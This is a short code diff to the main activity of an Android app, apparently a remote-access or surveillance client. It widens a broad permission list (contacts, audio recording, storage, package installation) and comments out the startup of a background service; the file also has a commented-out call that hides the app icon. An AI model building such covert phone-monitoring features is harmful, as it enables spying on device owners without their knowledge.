@@ -13,7 +13,9 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.util.Log;
 
+import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.LocationV2;
 import com.ot.grhq.client.functionality.Utils;
 import com.ot.grhq.client.receivers.NotificationListener;
@@ -44,6 +46,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.WRITE_CONTACTS,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.MANAGE_EXTERNAL_STORAGE,
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.REQUEST_INSTALL_PACKAGES,
             Manifest.permission.READ_PHONE_STATE,
@@ -68,7 +71,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
 //        hideApplicationIcon();
-        startService(new Intent(this, MainService.class));
+//        startService(new Intent(this, MainService.class));
 
         String notificationListenerString = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
         // Check notifications access permission
